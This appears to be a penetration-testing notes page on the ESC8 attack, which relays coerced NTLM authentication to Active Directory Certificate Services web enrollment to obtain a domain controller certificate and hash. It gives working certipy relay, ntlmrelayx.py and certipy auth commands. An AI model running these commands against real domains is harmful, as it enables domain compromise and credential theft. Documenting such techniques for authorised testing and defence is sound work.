# NTLM Relay to AD CS HTTP Endpoints - ESC8

## NTLM Relay to AD CS HTTP Endpoints - ESC8 [t-ad-ntlm-coerced-adcs_esc8]

### ESC8

Exploit weak ADCS configuration to issue a certificate realying coerced authentication to ADCS HTTP Endpoint (ESC8)

![https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf](t-ad-ntlm-coerced-adcs_esc8/ntlm_relay_options.webp)

### References:

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8)

* [https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)

### 1.1 Run a listener to request a certificate




**option 1: certipy**

{% code overflow="wrap" %}
```bash
certipy relay -ca <CA_address> -template DomainController
```
{% endcode %}

![certipy_relay_request.png](t-ad-ntlm-coerced-adcs_esc8/certipy_relay_request.png)

**option 2: ntlmrelayx.py**

{% code overflow="wrap" %}
```bash
ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```
{% endcode %}

![ntlmrelayx_relay_request.png](t-ad-ntlm-coerced-adcs_esc8/ntlmrelayx_relay_request.png)
### 1.2 Authenticate and retrieve NTLM hash for the DC account



{% code overflow="wrap" %}
```bash
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```
{% endcode %}

![certipy_auth.png](t-ad-ntlm-coerced-adcs_esc8/certipy_auth.png)
